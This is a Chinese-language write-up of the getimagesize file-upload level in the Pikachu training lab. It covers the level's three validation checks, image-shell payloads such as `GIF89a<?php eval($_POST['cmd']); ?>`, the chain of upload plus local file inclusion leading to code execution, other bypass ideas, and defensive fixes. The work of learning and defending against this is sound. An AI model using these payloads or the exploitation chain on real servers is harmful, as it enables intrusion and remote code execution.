# 文件上传 getimagesize 通关笔记

> 这一关是三层校验叠加：**扩展名白名单 + MIME + `getimagesize()`。**
>
> 我试了直接传 `.php`——被挡了。
>
> **因为扩展名被锁死，所以这一关不能直接 getshell，必须配合"文件包含"。**

---

## 一、环境与目标

| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Unsafe Fileupload → getimagesize |
| 页面地址 | `http://pikachu/vul/unsafeupload/getimagesize.php` |
| 提交方式 | POST（multipart/form-data） |
| 目标 | 尝试上传可执行的 PHP 文件 |

---

## 二、我的解题步骤

### 步骤 1：直接传 .php —— 被拒

```
文件名：shell.php
Content-Type：image/png
```

返回：

```
上传文件的后缀名不能为空，且必须是jpg,jpeg,png中的一个
```

**扩展名白名单，直接挡住了。**

### 步骤 2：看源码，确认三层校验

```php
$type=array('jpg','jpeg','png');//指定类型
$mime=array('image/jpg','image/jpeg','image/png');
$upload=upload('uploadfile','512000',$type,$mime,$save_path);
```

`upload()` 里的校验顺序：

```php
// 1. 后缀名白名单
if(!in_array(strtolower($arr_filename['extension']),$type)){
    $return_data['error']='上传文件的后缀名不能为空，且必须是'.implode(',',$type).'中的一个';
    return $return_data;
}

// 2. MIME 类型
if(!in_array($_FILES[$key]['type'], $mime)){
    $return_data['error']='你上传的是个假图片，不要欺骗我xxx！';
    return $return_data;
}

// 3. 真实图片检测
if(!getimagesize($_FILES[$key]['tmp_name'])){
    $return_data['error']='你上传的是个假图片，不要欺骗我！';
    return $return_data;
}

// 4. 大小限制
if($_FILES[$key]['size']>$size){ ... }

// 5. 生成新文件名（随机名 + 扩展名）
$new_filename=str_replace('.','',uniqid(mt_rand(100000,999999),true));
if($arr_filename['extension']!=''){
    $arr_filename['extension']=strtolower($arr_filename['extension']);
    $new_filename.=".{$arr_filename['extension']}";
}
```

### 步骤 3：试试"图片马"

用 Python 生成一张真实的 PNG，后面追加 PHP 代码：

```python
from PIL import Image
import io

buf = io.BytesIO()
Image.new("RGB", (10, 10), (255, 0, 0)).save(buf, "PNG")
png = buf.getvalue() + b'<?php echo "PIC_SHELL"; ?>'
```

文件名 `t9f3e.png`，`Content-Type: image/png`。

**上传成功：**

```
文件保存的路径为：uploads/2026/11/08/6543426af08eca771a1104722004.png
```

**三个校验全过了。**

### 步骤 4：尝试访问

```
http://pikachu/vul/unsafeupload/uploads/2026/11/08/6543426a....png
```

**浏览器把图片正常显示出来，PHP 代码没有被执行。**

因为服务器只把 `.php` 交给 PHP 解析器，`.png` 只是静态文件。

### 步骤 5：所以这一关要怎么打

**图片马 + 文件包含。**

把上传的 `.png` 用 `include` 包含进去——`include` 不看扩展名，只看内容：

```
http://pikachu/vul/fileinclude/fi_local.php?filename=../unsafeupload/uploads/2026/11/08/xxx.png&submit=
```

**图片里的 PHP 代码就会被执行。**

---

## 三、原理分析

### 3.1 为什么扩展名白名单这么致命

```php
if(!in_array(strtolower($arr_filename['extension']), $type)){
```

```php
$new_filename = 随机串 . '.' . strtolower($ext);
```

- 后缀必须在 `jpg/jpeg/png` 里
- 保存时**强制用小写扩展名**

**所以无论你传什么，落地都是 `.jpg/.jpeg/.png`——永远不会被执行。**

### 3.2 `getimagesize()` 能防住什么

```php
getimagesize($_FILES[$key]['tmp_name'])
```

它会读文件头，判断是不是合法图片。

**能防住：**

```php
<?php eval($_POST['cmd']); ?>
```

（纯 PHP 文件，没有图片结构，直接返回 false）

**防不住：**

```php
GIF89a<?php eval($_POST['cmd']); ?>
```

（有合法图片头，`getimagesize` 返回真，但文件里仍然有 PHP 代码）

**这就是"图片马"。**

### 3.3 图片马的三种做法

| 做法 | 说明 |
| --- | --- |
| **文件头 + PHP** | 直接 `GIF89a` 开头，后面接 PHP |
| **图片 + 追加** | 正常 PNG/JPG，末尾追加 PHP |
| **EXIF 注入** | 把 PHP 写进图片的 EXIF 字段 |

**这三种都能骗过 `getimagesize`。**

### 3.4 图片马为什么不能直接执行

```
Web 服务器（Apache/Nginx）的规则：
    .php  → 交给 PHP 解析器
    .png  → 当作静态文件返回
```

**后缀决定了"谁来处理这个文件"。**

图片马的后缀是 `.png`，所以服务器只把它当图片返回——里面的 PHP 代码只是"二进制垃圾"。

**必须有另一个入口（文件包含）来"执行"它。**

---

## 四、知识点与笔记

### 4.1 这一关能学到什么

| 教训 | 说明 |
| --- | --- |
| **三层校验叠加，很难绕** | 扩展名 + MIME + 真实图片 |
| **但"上传成功"不等于"能执行"** | 后缀锁死 |
| **组合拳才是常态** | 上传 + 包含 |
| 随机文件名 | 增加了"猜路径"的难度，但路径被页面输出了 |

### 4.2 页面输出了路径，这是个失误

```php
$html.="<p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
```

**路径直接被打印出来了**，所以"随机文件名"的防护等于没有。

### 4.3 其他可能的绕过思路（了解一下）

| 思路 | 说明 |
| --- | --- |
| `.htaccess` 上传 | 让 `.png` 被当 PHP 解析（需要能上传 .htaccess） |
| Apache 多后缀 | `shell.php.png`（看 `AddHandler` 配置） |
| 解析漏洞 | IIS 的 `shell.php;.jpg` |
| 条件竞争 | 上传后在被删除前访问 |

**这一关的扩展名白名单 + 随机名，把上面大部分路都堵死了。**

### 4.4 组合拳的完整链路

```
1. 上传图片马（.png，内含 PHP 代码）→ 成功
2. 拿到路径（页面直接输出）
3. 找到文件包含点（fi_local.php）
4. include 那个 .png → PHP 代码执行
5. RCE
```

**单独一个"上传"可能只是"存文件"，加了"包含"就变成了"执行"。**

---

## 五、和其他两关的区别

| 关卡 | 校验层数 | 能否直接 getshell |
| --- | --- | --- |
| client check | 0（只有前端） | ✅ 能 |
| MIME type | 1（Content-Type） | ✅ 能 |
| **getimagesize** | **3（后缀 + MIME + 图片）** | **❌ 不能，要配合包含** |

**这一关不是"更难的绕过"，而是"换一种思路"。**

---

## 六、防御怎么写

### 6.1 这一关的校验其实已经不错

| 措施 | 评价 |
| --- | --- |
| 扩展名白名单 | ✅ 正确 |
| MIME 校验 | ⚠️ 可绕过，但有比没有好 |
| `getimagesize` | ⚠️ 可绕过，但能挡住纯 PHP 文件 |
| 随机文件名 | ✅ 正确（但不该泄露路径） |
| 大小限制 | ✅ 正确 |

**缺的只有一条：上传目录禁止执行。**

### 6.2 补上最关键的一条

```nginx
location ^~ /uploads/ {
    location ~ \.php$ { deny all; }
}
```

**或者：上传目录不放 Web 根下，用 CDN/OSS。**

### 6.3 更彻底的：图片二次渲染

```php
$img = imagecreatefrompng($_FILES['uploadfile']['tmp_name']);
imagepng($img, 'uploads/' . $newName);
```

**重新生成图片，会丢掉所有追加的恶意数据。**

### 6.4 不要泄露路径

```php
// 不要这样
echo "保存路径：" . $save_path;

// 应该
echo "上传成功";
```

---

## 七、总结

| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 三层校验叠加时，要换思路 |
| 直接传 .php | **被扩展名白名单拒绝** |
| 图片马 | **能上传成功**（`.png` + PHP） |
| 能执行吗 | **不能**（后缀决定解析方式） |
| 正确打法 | **图片马 + 文件包含** |
| 修复 | 目录禁执行 + 二次渲染 |

**一句话**：

> **上传成功不等于能执行——决定"谁来解析"的是后缀，不是内容。**

---

## 参考

- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PHP: getimagesize](https://www.php.net/manual/zh/function.getimagesize.php)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
